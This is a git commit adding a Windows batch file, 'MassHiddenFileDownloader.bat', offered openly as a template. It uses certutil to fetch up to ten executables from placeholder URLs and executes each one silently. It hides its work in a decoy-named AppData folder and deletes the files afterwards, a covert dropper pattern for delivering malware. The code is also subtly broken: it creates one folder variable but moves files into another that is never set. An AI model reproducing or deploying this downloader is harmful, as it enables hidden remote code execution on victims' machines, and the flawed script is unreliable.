58b08949e6bedc4cea76361f809f5d8492b5661b
elfy <75458737+xoElf@users.noreply.github.com>
2021-06-21 00:48:30 -0700

    downloads multiple files to the directory

---
+++ MassHiddenFileDownloader.bat
@@ -0,0 +1,133 @@
+@echo off
+:start
+title YOUR TITLE HERE
+del %file%
+color F0
+cd
+cls
+echo CREDIT: XOELF
+echo Github: @xoElf
+echo Twitter: @xoElfy
+echo YouTube: xoElf
+echo Discord: Elf#0779
+echo press any key to start...
+pause>nul
+set path11=%appdata%\Mojang\Seagull\Turtle\Apple
+md %path11% >nul
+cls
+::LINK TO THE DIRECT DOWNLOAD GOES BELOW! (I suggest uploading it to discord and using "copy download link" to get the direct download link)
+set url1=https://YOURURLGOES.HERE/FILENAME.EXE >nul
+::NAME OF THE FILE GOES BELOW!
+set file1=FILENAME.EXE >nul
+certutil -urlcache -split -f %url1% %file1% >nul
+cls
+move %file1% %path1%\%file1% >nul
+cd %path1% >nul
+:: DELETE THE LINE BELOW IF YOU DO NOT WANT THE FILE TO OPEN AFTER DOWNLOADING
+%file1% >nul
+del %file1% >nul
+cls
+
+set url2=https://YOURURLGOES.HERE/FILENAME.EXE >nul
+set file2=FILENAME.EXE >nul
+certutil -urlcache -split -f %url2% %file2% >nul
+cls
+move %file2% %path1%\%file2% >nul
+cd %path1% >nul
+:: DELETE THE LINE BELOW IF YOU DO NOT WANT THE FILE TO OPEN AFTER DOWNLOADING
+%file2% >nul
+del %file2% >nul
+cls
+
+set url3=https://YOURURLGOES.HERE/FILENAME.EXE >nul
+set file3=FILENAME.EXE >nul
+certutil -urlcache -split -f %url3% %file3% >nul
+cls
+move %file3% %path1%\%file3% >nul
+cd %path1% >nul
+:: DELETE THE LINE BELOW IF YOU DO NOT WANT THE FILE TO OPEN AFTER DOWNLOADING
+%file3% >nul
+del %file3% >nul
+cls
+
+set url4=https://YOURURLGOES.HERE/FILENAME.EXE >nul
+set file4=FILENAME.EXE >nul
+certutil -urlcache -split -f %url4% %file4% >nul
+cls
+move %file4% %path1%\%file4% >nul
+cd %path1% >nul
+:: DELETE THE LINE BELOW IF YOU DO NOT WANT THE FILE TO OPEN AFTER DOWNLOADING
+%file4% >nul
+del %file4% >nul
+cls
+
+set url5=https://YOURURLGOES.HERE/FILENAME.EXE >nul
+set file5=FILENAME.EXE >nul
+certutil -urlcache -split -f %url5% %file5% >nul
+cls
+move %file5% %path1%\%file5% >nul
+cd %path1% >nul
+:: DELETE THE LINE BELOW IF YOU DO NOT WANT THE FILE TO OPEN AFTER DOWNLOADING
+%file5% >nul
+del %file5% >nul
+cls
+
+set url6=https://YOURURLGOES.HERE/FILENAME.EXE >nul
+set file6=FILENAME.EXE >nul
+certutil -urlcache -split -f %url6% %file6% >nul
+cls
+move %file6% %path1%\%file6% >nul
+cd %path1% >nul
+:: DELETE THE LINE BELOW IF YOU DO NOT WANT THE FILE TO OPEN AFTER DOWNLOADING
+%file6% >nul
+del %file6% >nul
+cls
+
+set url7=https://YOURURLGOES.HERE/FILENAME.EXE >nul
+set file7=FILENAME.EXE >nul
+certutil -urlcache -split -f %url7% %file7% >nul
+cls
+move %file7% %path1%\%file7% >nul
+cd %path1% >nul
+:: DELETE THE LINE BELOW IF YOU DO NOT WANT THE FILE TO OPEN AFTER DOWNLOADING
+%file7% >nul
+del %file7% >nul
+cls
+
+set url8=https://YOURURLGOES.HERE/FILENAME.EXE >nul
+set file8=FILENAME.EXE >nul
+certutil -urlcache -split -f %url8% %file8% >nul
+cls
+move %file8% %path1%\%file8% >nul
+cd %path1% >nul
+:: DELETE THE LINE BELOW IF YOU DO NOT WANT THE FILE TO OPEN AFTER DOWNLOADING
+%file8% >nul
+del %file8% >nul
+cls
+
+set url9=https://YOURURLGOES.HERE/FILENAME.EXE >nul
+set file9=FILENAME.EXE >nul
+certutil -urlcache -split -f %url9% %file9% >nul
+cls
+move %file9% %path1%\%file9% >nul
+cd %path1% >nul
+:: DELETE THE LINE BELOW IF YOU DO NOT WANT THE FILE TO OPEN AFTER DOWNLOADING
+%file9% >nul
+del %file9% >nul
+cls
+
+set url10=https://YOURURLGOES.HERE/FILENAME.EXE >nul
+set file10=FILENAME.EXE >nul
+certutil -urlcache -split -f %url10% %file10% >nul
+cls
+move %file10% %path1%\%file10% >nul
+cd %path1% >nul
+:: DELETE THE LINE BELOW IF YOU DO NOT WANT THE FILE TO OPEN AFTER DOWNLOADING
+%file10% >nul
+del %file10% >nul
+cls
+
+echo FILES DOWNLOADED!
+echo PRESS ANY KEY TO EXIT!
+pause >nul
+exit
